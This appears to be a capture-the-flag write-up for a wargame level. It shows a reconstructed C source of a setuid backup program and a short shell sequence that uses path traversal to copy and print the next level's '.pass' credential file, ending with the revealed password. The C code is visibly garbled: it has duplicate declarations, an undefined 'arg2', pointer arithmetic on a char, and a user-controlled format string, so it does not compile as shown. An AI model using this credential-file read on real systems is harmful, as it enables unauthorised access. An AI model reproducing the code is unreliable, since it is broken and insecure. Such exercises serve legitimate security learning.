

void log_wrapper(FILE *logfile, char *log, char *filename)
{
    char buf[256];
   
    strcpy(buf, arg2);
    snprintf(buf, 254 - strlen(buf), filename);

    buf[strcspn(buf, "\n")] = 0;

    fprintf(logfile, "LOG: %s\n", buf);

    return;
}


int main (int argc, char **argv)
{
    int32_t filebak;
    FILE *logfile;
    int64_t file;
    char **filename;

    char ptr;
    char filename[110] = "./backups";

    if (argc != 2)
        printf("Usage: %s filename\n", *argv);

    logfile = fopen("./backups/.log", "w");

    if (logfile == NULL) {
        printf("ERROR: Failed to open %s\n", "./backups/.log");
        exit(1);
    }

    log_wrapper(logfile, "Starting back up: ", argv[1]);

    file = fopen(argv[1], "r");

    if (file == NULL) {
        printf("ERROR: Failed to open %s\n", argv[1]);
        exit(1);
    }

    strncat(filename, argv[1], 99 - strlen(ptr + 1));
    filebak = open(filename, 0xc1, 0x1b0);

    if (filebak <= -1) {
        printf("ERROR: Failed to open %s%s\n", "./backups/", argv[1]);
        exit(1);
    }

    ptr = fgetc(file);
    while (ptr != -1) {
        write(filebak, &ptr, 1);
        ptr = fgetc(file);
    }

    log_wrapper(logfile, "Finished back up ", argv[1]);

    fclose(file);
    close(filebak);

    return 0;
}


cd /tmp
mkdir -p backups home/users/level09
/home/users/level08/level08 ../home/users/level09/.pass
cat home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S